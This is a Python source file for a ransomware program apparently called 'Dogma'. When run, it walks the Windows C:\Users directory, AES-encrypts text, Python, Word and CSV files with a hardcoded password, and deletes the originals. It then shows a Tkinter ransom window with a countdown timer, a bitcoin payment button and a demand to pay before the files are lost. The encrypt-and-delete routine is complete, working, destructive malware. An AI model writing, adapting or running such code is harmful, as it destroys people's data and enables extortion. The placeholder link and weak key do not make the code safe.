from tkinter import *
from PIL import ImageTk, Image
import tkinter as tk
import tkinter
import os
import sys
import webbrowser
import pyAesCrypt

# Version
version = "1.5.3"

# Get dogma file
f = open("C:\\dogma_file.txt", "w+")

# encryption/decryption buffer size - 64K
bufferSize = 64 * 1024
password = "12345"


# Relative Path for Pyinstaller
def resource_path(relative_path):
    """ Get absolute path to resource, works for dev and for PyInstaller """
    try:
        # PyInstaller creates a temp folder and stores path in _MEIPASS
        base_path = sys._MEIPASS
    except Exception:
        base_path = os.path.abspath(".")

    return os.path.join(base_path, relative_path)


# Encrypte file
def encrypt():
    for root_path, dirs, files in os.walk("C:\\Users\\"):
        for file in files:
            if file.endswith((".txt", ".py", ".docx", ".csv")):  # The arg can be a tuple of suffixes to look for
                unique_file = os.path.join(file)
                unique_path = os.path.join(root_path + "/")
                format_file = unique_file[:-4]
                print(root_path + format_file)
                pyAesCrypt.encryptFile(unique_path + unique_file, unique_path + format_file + ".dogma",
                                       password,
                                       bufferSize)

encrypt()


# Remove Uncrypted File
def remove_uncrypted_file():
    for root_path, dirs, files in os.walk("C:\\Users\\"):
        for file in files:
            if file.endswith((".txt", ".py", ".docx", ".csv")):  # The arg can be a tuple of suffixes to look for
                unique_file = os.path.join(file)
                unique_path = os.path.join(root_path + "/")
                os.remove(unique_path + unique_file)

remove_uncrypted_file()


                
# Get and write in file dogma file list
def get_and_write_dogma_file():
    for root_path, dirs, files in os.walk("C:\\Users\\"):
        for file in files:
            if file.endswith(".dogma"):  # The arg can be a tuple of suffixes to look for
                f.write(str(file) + os.linesep)


# Run func
get_and_write_dogma_file()

# close output dogma file
f.close()

# Open Output dogma file
ai = open("C:\\dogma_file.txt", "r")
content = ai.read()


logo = resource_path("red_lock_logo.png")
bitcoin_logo = resource_path("bitcoin_logo.png")
Warning_logo = resource_path("Warning_Logo.png")
Win_Logo = resource_path("Win_Logo.png")


# WebServer Call Function
def web_server_link():
    webbrowser.open("https://www.google.com/")


#              #
# Chrono Class #
#              #
class Chrono(tkinter.Label):

    def __init__(self, form):
        tkinter.Label.__init__(self, form, text='Starting')
        self.label = Label(self, text="", width=10)
        self.label.pack()
        self.remaining = 0
        self.countdown(1800)

    def countdown(self, remaining=None):
        if remaining is not None:
            self.remaining = remaining

        if self.remaining <= 0:
            self.label.configure(text="time's up!")
        else:
            self.label.configure(text="{:d} s".format(self.remaining))
            self.label.config(fg="gold", bg="gray17", font="34")
            self.remaining = self.remaining - 1
            self.after(1000, self.countdown)


#            #
# Form Class #
#            #
class Form:

    def __init__(self, master):

        # main form
        self.master = master
        self.master.geometry('600x550+850+250')
        self.master.title("Dogma " + version)
        self.master.config(bg="gray17")
        self.master.resizable(False, False)

        # Object Label 1
        self.label = Label(self.master, text='DOGMA', bg="gray17",
                           fg="dodgerblue", font=('bahnschrift', 24))
        self.label.place(x=250, y=20)

        # Object Label 2
        self.label2 = Label(self.master, text='YOUR FILES HAVE BEEN ENCRYPTED !',
                            bg="gray17", fg="GOLD",
                            font=('bahnschrift', 12))
        self.label2.place(x=190, y=70)

        # Object Image 1
        self.img1 = ImageTk.PhotoImage(Image.open(logo))
        self.Label_img = Label(self.master, image=self.img1, bg="gray17",
                               borderwidth=5, relief="ridge")
        self.Label_img.place(x=10, y=160)

        # Object Time Remaining Label
        self.label_time = Label(self.master, text='TIME REMAINING',
                                bg="gray17", fg="dodgerblue",
                                font=('bahnschrift', 10,)).place(x=10, y=305)
        self.label_time = Chrono(self.master).place(x=10, y=330)

        # Object BitCoin Button
        self.b_img = ImageTk.PhotoImage(Image.open(bitcoin_logo))
        self.b = Button(self.master, image=self.b_img, bg="gold", borderwidth=5, relief="groove",
                        command=web_server_link)
        self.b.place(x=10, y=400)

        # List .dogma file button
        self.b_list_file = Button(self.master, bg="gray17", fg="gold",
                                  activebackground="gray17",
                                  activeforeground="dodgerblue",
                                  text="encrypted files",
                                  command=self.top_level_dogma_file)
        self.b_list_file.place(x=10, y=500)

        # Object Wallet Adress Label
        self.label3 = Label(self.master, text="Wallet Adress: ", fg="gold",
                            bg="gray17", font=('bahnschrift', 10))
        self.label3.place(x=10, y=460)
        self.label4 = Label(self.master, text="RW52b2lzIGRlIGxhIGNsZWY=",
                            fg="snow", bg="gray17",
                            font=('bahnschrift', 10))
        self.label4.place(x=120, y=460)

        # Object Decryption Button
        self.b2 = Button(self.master, text="Enter Decryption Key",
                         activeforeground="dodgerblue",
                         command=self.top_level_decryption_button)
        self.b2.place(x=390, y=460)

        # Object TextBox
        self.text_box = Text(self.master, height=20, width=50)
        self.text_box.config(fg="gray17", bg="white")
        self.text_box.insert(tk.END, "The important files on your computer have been\n"
                                     "encrypted with military grade AES-256 bit\n"
                                     "encryption.\n"
                                     "\n"
                                     "Your documents, videos, images and other foms\n"
                                     "of data are now inaccessible and cannot\n"
                                     "be unlocked without the decryption key.\n"
                                     "\n"
                                     "This key is currently\n"
                                     "being stored on a remote server.\n"
                                     "\n"
                                     "To acquire this key, transfer the bifcoin fee to\n"
                                     "the specified wallet address before the time runs out.\n"
                                     "\n"
                                     "If you fail to take action within this time window\n"
                                     "will be destoryed and access to your files will\n"
                                     "be permanently lost.")
        self.text_box.configure(state="disable")
        self.text_box.place(x=150, y=105)

    # Top Level for decryption button
    def top_level_decryption_button(self):
        self.top = Toplevel(self.master)
        self.top.geometry('335x70+200+145')
        self.top.config(bg="gray17")
        self.top.resizable(False, False)

        # Object Label Top Level
        self.top_label = Label(self.top, text="Enter Decryption Key",
                               fg="gold", bg="gray17",
                               font=('bahnschrift', 10))
        self.top_label.place(x=10, y=10)

        # Object TextBox Top Level
        self.text_box2_entry = Entry(self.top)
        self.text_box2_entry.grid(padx=10, pady=40)

        # Object Button Validation Top Level
        self.b_val = Button(self.top, text="Validation",
                            command=self.toplevel2)
        self.b_val.place(x=200, y=35)

    # Top level for list Dogma File
    def top_level_dogma_file(self):
        self.top = Toplevel(self.master)
        self.top.geometry('600x550+200+250')
        self.top.config(bg="gray17")
        self.top.resizable(False, False)
        self.text_box = Text(self.top, height=30, width=70)
        self.text_box.config(fg="gray17", bg="white")
        self.text_box.insert(tk.END, content)
        self.text_box.configure(state="disable")
        self.text_box.place(x=10, y=10)

    # Top level 2
    def toplevel2(self):
        self.user_input = self.text_box2_entry.get()
        self.top2 = Toplevel(self.top)
        self.top2.resizable(False, False)
        self.top2.geometry('335x150+550+65')
        self.top2.config(bg="gray17")

        # Valide condition
        if self.user_input == "12345":

            try:
                for root_path, dirs, files in os.walk("C:\\Users\\"):
                    for file in files:
                        if file.endswith(".dogma"):  # The arg can be a tuple of suffixes to look for

                            # Get Dogma file
                            unique_file = os.path.join(file)

                            # Get Unique path
                            unique_path = os.path.join(root_path + "/")

                            # Reformat .dogma file
                            format_file = unique_file[:-5]
                            print(unique_path + file)

                            # Decrypt file
                            pyAesCrypt.decryptFile(unique_path + file,
                                                   unique_path + format_file, password,
                                                   bufferSize)
                            os.remove(unique_path + file)

            except ValueError:
                print("Password Error [!]")

            self.img_win = ImageTk.PhotoImage(Image.open(Win_Logo))
            self.img_Win_label = Label(self.top2, image=self.img_win, bg="gray17")
            self.img_Win_label.pack()
            self.label5 = Label(self.top2, fg="gold", bg="gray17",
                                text="Congratulation ! All your DATA is unlock.")
            self.b_quit = Button(self.top2, text="Quit",
                                 fg="gray17", bg="gold", command=root.destroy)
            self.b_quit.place(x=150, y=100)
            self.label5.pack()

        else:
            self.top2.geometry('335x100+550+115')
            self.img_warn = ImageTk.PhotoImage(Image.open(Warning_logo))
            self.img_warn_label = Label(self.top2, image=self.img_warn, bg="gray17")
            self.img_warn_label.pack()
            self.label5 = Label(self.top2,
                                text="Warning: The Decryption Key is incorrect",
                                bg="gray17", fg="gold")
            self.label5.pack()


root = Tk()
main = Form(root)
root.mainloop()
